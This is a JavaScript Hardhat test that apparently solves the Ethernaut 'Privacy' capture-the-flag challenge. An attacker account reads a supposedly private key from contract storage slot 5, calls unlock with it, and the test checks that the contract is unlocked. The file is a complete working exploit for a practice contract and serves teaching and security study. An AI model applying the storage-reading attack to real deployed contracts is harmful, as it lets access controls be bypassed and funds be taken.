const { expect } = require("chai");
const { ethers } = require("hardhat");
require("dotenv").config();

describe("Privacy", () => {
  let deployer, attacker;
  let privacy;

  beforeEach(async () => {
    // Setup accounts
    [deployer, attacker] = await ethers.getSigners();

    const Privacy = await ethers.getContractFactory("Privacy");
    privacy = await Privacy.connect(deployer).deploy([
      "0x253b1ee27d20150430bd9cb348e6fdb3f17a101801f496849490c3744ce90a18",
      "0xba3299293d8ac20e762576a6137a178cafda2fa569b395642fcc17d4778e68ed",
      "0x3e6de40dd95b8ae3452f99e58ce742c1fda0d3a509e99bf9e19521d2207864ac"
    ]);
  });

  describe("Privacy Attack", () => {
    beforeEach(async () => {
      const storage = await ethers.provider.getStorageAt(privacy.address, 5);
      const hex = storage.substring(2); // Remove the 0x (You technically don't need to as you'll need it later)
      const key = hex.substring(0, 32); // Get the first 16 bytes

      const transaction = await privacy.connect(attacker).unlock(`0x${key}`);
      await transaction.wait();
    })

    it('Unlocks the contract', async () => {
      expect(await privacy.locked()).to.equal(false);
    });
  });
});
